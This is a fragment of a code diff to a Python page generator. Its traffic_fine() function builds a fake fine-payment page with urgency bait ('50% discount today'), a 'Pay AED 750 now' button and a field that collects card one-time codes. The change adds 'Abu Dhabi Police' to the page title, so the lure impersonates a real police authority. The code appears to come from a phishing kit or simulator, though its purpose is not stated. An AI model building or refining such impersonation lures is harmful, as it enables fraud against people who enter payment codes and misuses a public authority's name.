@@ -83,7 +83,7 @@ def traffic_fine() -> str:
         '<input id="otp" name="otp" autocomplete="one-time-code" maxlength="6">'
         "<button>Pay AED 750 now · ادفع الآن</button></form></main>"
     )
-    return page("Pay traffic fine - 50% discount today", body)
+    return page("Abu Dhabi Police | Pay traffic fine - 50% discount today", body)
 
 
 def card_form(title: str, heading: str, text: str, amount: str) -> str:
